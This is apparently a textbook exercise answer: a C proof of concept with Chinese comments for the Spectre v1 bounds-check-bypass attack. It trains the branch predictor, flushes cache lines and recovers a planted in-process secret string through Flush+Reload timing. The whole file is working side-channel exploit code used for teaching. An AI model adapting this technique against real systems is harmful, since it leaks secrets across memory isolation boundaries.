// SPDX-License-Identifier: GPL-2.0
/*
 * spectre_v1.c —— Q7「CPU 幽靈漏洞變體1」的實機 PoC（越界檢查繞過）。
 *
 * 完全對應書上 §6.3.2（行 608-666）的偽代碼：
 *
 *     if (x < array1_size)                //  <-- 邊界檢查
 *         y = array2[array1[x] * 4096];   //  <-- 被推測執行的越界讀取
 *
 * 攻擊步驟（書上行 654-659）：
 *   (1) 用「合法的 x」反覆訓練分支預測器，讓它學會「條件成立、走 if 內」；
 *   (2) flush array1_size 與 array2[]（讓邊界檢查變慢、side channel 乾淨）；
 *   (3) 餵一個「越界的 x」= &secret - &array1；分支預測器仍預測成立，
 *       於是「推測地」讀了 secret，並以 secret 值當索引把 array2 某條 line
 *       拉進 cache（雖然架構上這條路最終被丟棄）；
 *   (4) Flush+Reload 掃 array2[]，哪個 index 變快，就反推出 secret 的值。
 *
 * 這是同一個進程內把「本不該讀到的字串 the_secret[]」偷出來，證明推測執行
 * 會跨越邊界檢查洩漏資料。需要先 `sudo insmod pmu_user.ko`。
 *   gcc -O2 -o spectre_v1 spectre_v1.c && taskset -c 4 ./spectre_v1
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "sidechannel.h"

#define PGSZ 4160   /* 步長錯開 page 又讓每個 slot 落在不同 L1 cache set（見 flush_reload.c） */

unsigned array1_size = 16;
uint8_t  unused1[64];
uint8_t  array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t  unused2[64];
uint8_t  array2[256 * PGSZ];

/* 攻擊者「架構上」無權讀的祕密（但在同一位址空間，供 PoC 用） */
const char *the_secret = "The Magic Words are Squeamish Ossifrage.";

volatile uint8_t sink;

/* 被攻擊的受害者函式：一個看似安全的邊界檢查 */
static void victim(size_t x)
{
	if (x < array1_size)
		sink = array2[array1[x] * PGSZ];   /* 推測執行時會越界 */
}

/* 對一個 secret byte 偏移量，回傳側信道還原出的值 */
static int leak_byte(size_t malicious_x, uint64_t threshold)
{
	static int results[256];
	int tries, i, j;

	memset(results, 0, sizeof(results));

	for (tries = 0; tries < 1000; tries++) {
		/* (2) flush 整個 array2 */
		for (i = 0; i < 256; i++)
			flush(&array2[i * PGSZ]);
		mfence();

		/* (1) 訓練：5 次合法索引 + 第 6 次餵惡意索引（Kocher 手法）。
		 *     用位元技巧讓 x 在 5 次合法後變成惡意值，避免用 if 破壞預測。 */
		size_t training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			volatile int z;
			flush(&array1_size);                  /* 讓邊界檢查變慢 -> 拉長推測窗 */
			/* 延遲，等 flush 生效、bounds check 真的 stall */
			for (z = 0; z < 100; z++) { asm volatile("" ::: "memory"); }
			/* j%6==0 時 x=malicious_x，否則 x=training_x（無分支選擇） */
			size_t x = ((j % 6) - 1) & ~0xFFFF;   /* 0 或 0xFF..0000 */
			x = (x | (x >> 16));
			x = training_x ^ (x & (malicious_x ^ training_x));
			victim(x);                            /* (3) 觸發推測讀取 */
		}

		/* (4) Flush+Reload：亂序掃 array2，找變快的 index */
		for (i = 0; i < 256; i++) {
			int mix = ((i * 167) + 13) & 255;
			volatile uint8_t *addr = &array2[mix * PGSZ];
			uint64_t t = probe_time((void *)addr);
			if (t < threshold)
				results[mix]++;
		}
	}
	/* 排除訓練殘留：array2[array1[0..15]] = array2[1..16] 是合法訓練造成的，
	 * 另外 index 0 常是「推測到但值未及時前傳=0」的雜訊，一併排除。 */
	results[0] = 0;
	for (i = 0; i < (int)array1_size; i++)
		results[array1[i]] = 0;

	/* 取得票最高者 */
	int best = -1, second = -1;
	for (i = 0; i < 256; i++) {
		if (best < 0 || results[i] > results[best]) { second = best; best = i; }
		else if (second < 0 || results[i] > results[second]) second = i;
	}
	printf("   最佳猜測 0x%02x '%c' (%d 票)  次高 0x%02x (%d 票)\n",
	       best, (best >= 32 && best < 127) ? best : '.', results[best],
	       second, results[second]);
	return best;
}

int main(void)
{
	if (sc_timer_init() < 0) {
		fprintf(stderr, "錯誤：拿不到週期計數器。`sudo sysctl kernel.perf_user_access=1`\n");
		return 1;
	}

	/* fault-in + 粗略門檻校準 */
	for (int i = 0; i < 256; i++) array2[i * PGSZ] = 1;
	volatile uint8_t *s = &array2[64 * PGSZ];
	uint64_t hit = 0, miss = 0;
	for (int i = 0; i < 50000; i++) {
		flush((void *)s); mfence(); miss += probe_time((void *)s);
		maccess((void *)s); mfence(); hit += probe_time((void *)s);
	}
	uint64_t threshold = (hit / 50000 + miss / 50000) / 2;
	printf("[校準] 命中 %lu / 未命中 %lu 週期 -> 門檻 %lu\n",
	       hit / 50000, miss / 50000, threshold);

	size_t base = (size_t)the_secret - (size_t)array1;
	int len = strlen(the_secret);
	printf("[Spectre v1] 從邊界檢查後方推測洩漏 \"%s\"\n", the_secret);
	printf("  array1_size=%u, secret 偏移 base=%zu\n\n", array1_size, base);

	int ok = 0;
	char out[128] = {0};
	for (int k = 0; k < len; k++) {
		printf(" byte %2d:", k);
		int v = leak_byte(base + k, threshold);
		out[k] = (v > 0) ? v : '?';
		ok += (v == (uint8_t)the_secret[k]);
	}
	printf("\n還原結果：\"%s\"\n", out);
	printf("正確 %d/%d 個位元組\n", ok, len);
	printf("\n結論：即使有 `if (x<size)` 邊界檢查，推測執行仍越界洩漏了資料。\n");
	return 0;
}
